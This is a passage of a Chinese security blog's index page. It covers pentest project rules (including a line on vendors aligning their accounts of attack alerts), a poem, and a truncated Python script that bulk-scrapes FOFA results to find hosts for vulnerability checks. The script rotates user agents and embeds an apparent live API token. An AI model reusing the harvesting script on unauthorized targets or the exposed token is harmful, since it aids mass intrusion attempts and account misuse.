-<li>Sql 注入，只需要出现数据库名称即可，不能进行数据查看。</li>
-<li>shell 或者命令执行，推荐上传一个文本证明，如纯文本的1.php、1.jsp等证明问题存在即可，禁止下载和读取服务器上任何源代码文件和敏感文件，不要执行删除、写入命令，如果是上传的webshell文件，请写明shell文件地址和连接口令。</li>
-<li>越权增删改，请使用自己的测试账号进行。账号不可注册的情况下，如果获取到该系统的帐密并验证成功，如需进一步安全测试，请咨询客户得到同意后进行测试。</li>
-<li>存储xss漏洞，尽量插入不影响他人的测试payload。</li>
-<li>关于漏洞扫描项目，在实施前先沟通清楚客户有没有监管单位的检查，大概用什么检查，都什么时候检查，我们对症下药（监管机构用什么扫描器我们尽量用什么扫描器），以免我们扫描结果与监管单位扫描结果有出入，从而被客户质疑我们的项目实施能力。</li>
-</ol>
-<h3 id="电网渗透测试注意事项"><a href="#电网渗透测试注意事项" class="headerlink" title="电网渗透测试注意事项"></a>电网渗透测试注意事项</h3><ol>
-<li>在工作时间内不能进行常规扫描任务。</li>
-<li>做过的系统，多发发现、挖掘漏洞，尽量不要让护网的红队，发现在我们做过的系统有较严重的漏洞，如某个中间件能rce，我们没发现，后面被红队发现，国网会进行通报，之后他们会追责。</li>
-<li>尽量不要进行电话之类的口头话，用邮件留下证据，如某个系统发现一个漏洞，厂家直接电话回复，这个系统是旧版本，要下线关停，漏洞无需整改，没有留下有邮件之类的说明，之后被红队发现，通报后，解释很麻烦。</li>
-<li>如果有攻击事件告警牵涉到多家厂商分析，一定要说法一样，不要出现，我说这是误报，你说是真实攻击的情况。</li>
-<li>国网文档部分要求比较严格，文档会有人专门审核，并且最终成果会与合同中的服务内容一一对应。</li>
-<li>国网的漏洞一把内网比较多，在挖掘时多关注内网渗透这方面。</li>
-</ol>
-<h3 id="关于文档"><a href="#关于文档" class="headerlink" title="关于文档"></a>关于文档</h3><ol>
-<li>先列出思路，框架，整体逻辑，对相关数据进行量化；整体思路以及框架整理很重要，这个做好了，后续文档就有据可依，如果这一步没做好，后面写文档的时候就想着稀里糊涂的，极易产生多余的工作量，结果还没做好。</li>
-<li>项目实施过程中，当处理完一个问题或者一件新的东西对其进行总结，依据具体情况形成经验文档。</li>
-<li>写日报等汇报文档，1）写清楚什么原因在什么地方和谁做了什么工作内容，达到了什么正面效果。最好能体现四个方面的能力（技术能力、协调能力、沟通能力、工作态度）2）凡是涉及项目范围、项目内容、项目目标、客户需求等内容均可以写进日报。</li>
-<li>关于其它文档内容（如报告、PPT）要逻辑自洽，清楚自己当前讲的是什么东西，不要被客户问得一问三不知，要考虑到每一个疑问点，并在汇报前就解决掉，不能给自己挖坑。</li>
-<li>重要的不在于细节，重要的在于整体的思路和丰富度，无论是文档还是其它材料，都是如此。</li>
-</ol>
-<h3 id="关于PPT"><a href="#关于PPT" class="headerlink" title="关于PPT"></a>关于PPT</h3><ol>
-<li>和写文档一样，制作PPT（如开工，阶段总结，项目总结，产品介绍，服务介绍等）也是需要先列出思路，框架，整体逻辑，对相关数据进行量化；这些依旧很重要，这个做好了，后续写PPT就有据可循，如果这一步没做好，后面写PPT的时候就想稀里糊涂的，极易产生多余的工作量，结果还做不好。</li>
-<li>写PPT不同与写word文档，需要在每一页PPT里面突出想描述的重点，最大限度精简相关描述，用最简短的话语描述出想表达的意思。</li>
-<li>每页PPT都不能是长篇大论的温习描述，这样对观看着很不友好，也勾不起观看者继续观看下去的欲望，所以每页PPT都需要结合1-2张图片（可多不可少）来进行更直观的描述，<strong>图片比文字更容易让人接受和理解。</strong></li>
-<li>前期尽可能的手机需要的素材，比如相关方案，照片，图片等，编写的时候多在网上寻找模板和需要的素材，但是必须得是结合总体思路和公司惯用的PPT母版元素的，总之就一句话，尽量在总体框架下，丰富PPT里面的内容，多插入图片以及其它素材，使PPT更有美感，让人容易接受，有观看下去的欲望。</li>
-</ol>
-<p>ps:</p>
-<p>ppt模板类网站</p>
-<p><a target="_blank" rel="noopener" href="http://www.tretars.com/">http://www.tretars.com</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.51pptmoban.com/">http://www.51pptmoban.com</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.ypppt.com/">http://www.ypppt.com</a></p>
-<p>元素类网站</p>
-<p><strong><a target="_blank" rel="noopener" href="https://www.iconfont.cn/">https://www.iconfont.cn</a></strong></p>
-<p>背景类</p>
-<p><a target="_blank" rel="noopener" href="https://www.hituyu.com/">https://www.hituyu.com</a></p>
-<p>公众号</p>
-<p>秋叶PPT</p>
-<h3 id="项目实施后"><a href="#项目实施后" class="headerlink" title="项目实施后"></a>项目实施后</h3><ol>
-<li>项目实施结束后，确定项目相关文件已经销毁或者妥善安全保存，提前告知客户我们具体离场时间，妥善安排好对客户或合作商的离场交接，并告知销售，质量管理人员等相关人员离场事宜。</li>
-<li>总结好此次项目经验，在下一个项目中应用，达到总结经验的目的。</li>
-</ol>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/07/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%98%B2%E5%9D%91%E6%8C%87%E5%8D%97/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-人生苦短、多活几年！" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/">人生苦短、多活几年！</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/" class="archive-article-date">
-        <time datetime="2021-07-08T09:38:56.334Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-08</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>From tomorrow on, I will be a happy man.</p>
-<p>Grooming,chopping and traveling all over the word.</p>
-<p>From tomorrow on, I will care foodstuff and vegetable.</p>
-<p>Living in a house towards the sea, with spring blossoms.</p>
-<p>From tomorrow on, write to each of my dear ones.</p>
-<p>Telling them of my happiness.</p>
-<p>What the lightening of happiness has told me.</p>
-<p>I will spread it to each of them.</p>
-<p>Give a warm name for every river and every mountain.</p>
-<p>Strangers, I will also wish you happy.</p>
-<p>May you have a brilliant future !</p>
-<p>May you lovers eventually becomes spouses !</p>
-<p>May you enjoy happiness in this earthly word !</p>
-<p>I only wish to face the sea, with spring blossoms.</p>
-<p>做个爱自己的人、读书、吃饭、多睡觉，健谈、健体、不油腻。</p>
-    
-    <a class="article-more-a" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">习惯</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-批量采集fofa搜索结果" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/">批量采集fofa搜索结果</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/" class="archive-article-date">
-        <time datetime="2021-06-16T18:35:49.455Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-17</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>今天看到某漏洞爆出，想进行批量采集url进行漏洞验证。奈何网上没有找到现成得脚本，于是自己写了一个采集fofa搜索引擎结果的脚本。具体功能相信各位自己都懂，直接上代码吧：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @author: kriller</span></span><br><span class="line"><span class="string">  @license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.</span></span><br><span class="line"><span class="string">  @contact: kriller@cumt.edu.cn</span></span><br><span class="line"><span class="string">  @file: fofa.py</span></span><br><span class="line"><span class="string">  @time: 2021/6/17 1:57</span></span><br><span class="line"><span class="string">  @desc:</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaders</span>():</span></span><br><span class="line">  <span class="comment"># 随机ua池</span></span><br><span class="line">  user_agent_list = [</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; &#x27;</span><span class="string">&#x27;x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  uaa = random.choice(user_agent_list)</span><br><span class="line">  <span class="comment">#Authorization字段里面有认证信息</span></span><br><span class="line">  header = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;api.fofa.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6NzkzMTIsIm1pZCI6MTAwMDQ5Mjk1LCJ1c2VybmFtZSI6ImtyaWxsZXIiLCJleHAiOjE2MjM4ODk1ODguODg2NzU3MSwiaXNzIjoicmVmcmVzaCJ9.zhBsOIeNCWCtv7Tdr0n4m3x2HBkYrzesRB0c5ZUyk7lNgLVmEjQPL-B1QDEmASFJTop05f-Yt7WApIiz3XIa7w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  header[<span class="string">&#x27;User-Agent&#x27;</span>] = uaa</span><br><span class="line">  print(header)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">run</span>():</span></span><br><span class="line">  keyword = <span class="built_in">input</span>(<span class="string">&quot;输入搜索内容&quot;</span>)</span><br><span class="line">  print(<span class="built_in">type</span>(keyword))</span><br><span class="line">  page = <span class="built_in">input</span>(<span class="string">&quot;输入页数,最多五页，每页10个结果&quot;</span>)</span><br><span class="line">  keyword_base64 = base64.b64encode(keyword.encode())</span><br><span class="line">  url = <span class="string">&#x27;http://api.fofa.so/v1/search?&#x27;</span></span><br><span class="line">  <span class="comment"># 参数写成一个字典</span></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: keyword,</span><br><span class="line">    <span class="string">&#x27;qbase64&#x27;</span>: keyword_base64,</span><br><span class="line">    <span class="string">&#x27;full&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: page,</span><br><span class="line">    <span class="string">&#x27;ps&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  query_str = parse.urlencode(data);</span><br><span class="line"></span><br><span 